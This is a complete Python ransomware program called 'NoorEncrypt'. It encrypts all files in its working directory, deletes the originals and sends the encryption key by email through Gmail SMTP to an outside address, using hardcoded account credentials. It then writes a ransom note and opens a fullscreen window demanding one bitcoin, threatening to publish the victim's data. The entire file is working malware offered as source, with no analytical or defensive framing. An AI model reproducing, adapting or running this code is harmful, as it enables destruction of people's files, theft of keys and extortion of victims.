#!/usr/bin/python3

from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from tkinter import *
import threading
import smtplib
import random
import sys
import os




#-----------------------------------------------------------------------------
# Encrypt and Decrypt files using Symmetric Encryption
# That means we will use one key to Encrypt and Decrypt files
# Encrypt all files in current directory and change file extention with .noor
#-----------------------------------------------------------------------------




class NoorEncrypt:

	def __init__(self):
		self.myID = random.randint(11111,99999)
		self.generateKey()
		with open('file.txt','rb')as f:
			self.Key = f.read()
			f.close()

		try:		
			t1 = threading.Thread(target=self.send_logs, args=(self.Key,))	
			t2 = threading.Thread(target=self.encryptFiles, args=(self.Key,))	
			t3 = threading.Thread(target=self.writeInst, args=(self.textInfo,))	
			t4 = threading.Thread(target=self.window, args=(self.textInfo,))	
			
			t1.start()
			t2.start()
			t3.start()
			t4.start()

			
		except:
			pass
	@property
	def textInfo(self):

		info = "\n\nDear victim:\nYour computer is locked by the Ransomware\nTo unlock your computer,\n \
		You have 24 HOURS to purchase 1 bitcoin and transfert it to this address :\n \
		10YVappJyjiBTWvyuQobmnijk3thbdiwUE092msaDLoL\n \
		\nWarning: \n\
		Restarting your computer is USELESS\n\n\
		And if you restart your computer, a new encryption key will be generated,\n\
		then you will have to pay 1 bitcoin for each generated key,\n\
		then the time on the counter will be 12 hours less ...\n\
		And if you dont pay, your sensitive data will be pubished or sold.\n\n\
		\n\nInstructions:\n\n \
		You must go to a crypto currency platform, such as coinpot.co, or coinbase.com.\n\n \
		You will need to create an account to be able to purchase 'Bitcoin', which you will use to pay for the Ransom.\n\n\
		When you are going to send the payment, you have to attach the ID number {0}".format(self.myID)
	
		return info

	
	def generateKey(self):
		try:
			key = Fernet.generate_key()
			with open('file.txt','wb') as f:
				f.write(key)
				f.close()
		except:
			pass

	def send_logs(self,key):
		try:

			fromAddr = "ransompatient22@gmail.com"
			fromPswd = "QQQ123!@#"
			toAddr = "noorthamer26@gmail.com"

			getKey = str(key)

			subject = 'Encryption key ID {0}'.format(self.myID)

			msg = MIMEMultipart()
			msg['From'] = fromAddr
			msg['To'] = toAddr
			msg['Subject'] = subject
			body = getKey
			msg.attach(MIMEText(body,'plain'))
			
			part = MIMEBase('application','octect-stream')
			part.set_payload(body)
			encoders.encode_base64(part)

			text = msg.as_string()
			#print('test msg.as_string')

			s = smtplib.SMTP('smtp.gmail.com',587)
			s.ehlo()
			s.starttls()
			#print('starttls')
			s.ehlo()
			s.login(fromAddr,fromPswd)
			s.sendmail(fromAddr,toAddr,text)

			#print('sent mail')

			s.close()



		except Exception as errorString:
			#print('[!] send_logs key/ Error.. ~ %s' % (errorString))
			pass



	def encryptFiles(self,encKey):
		KEY = encKey
		key = Fernet(KEY)
		# Encrypt all files exists in current directory using object [key]
		all_files_in_current_dir = os.listdir()
		# Get name of our Ransomware file to skip Encrypt it
		ourFile = sys.argv[0].split('/')[-1]

		for filee in all_files_in_current_dir:
			check = filee.split(".")[-1]
			if os.path.isfile(filee) and check != 'noor' :

				if filee == ourFile or filee == 'README.txt':
					pass
				else:
					with open(filee,"rb") as f:
						content = f.read()
						f.close()

					os.remove(filee)

					Encrypted = key.encrypt(content)

					newName = filee+".noor"
					with open(newName,"wb") as f:
						f.write(Encrypted)
						f.close()


	
	def writeInst(self,info):
		info = info
		with open('README.txt','w') as f:
			f.write(info)
			f.close()




	def window(self,info):
		root = Tk()
		root.title("Payment Instruction")
		#root.geometry("700x600")
		root.attributes('-fullscreen',True)
		root.configure(background='#0f0d4a')
		info = info
		lb = Label(root,text=info,background='#0f0d4a', foreground='#ffffdd',justify=LEFT,font=('Times', '17'))
		lb.pack()
		root.mainloop()





		
if __name__ == "__main__":
	try:	
		run = NoorEncrypt()
	except Exception as err:
		#print(err)
		pass

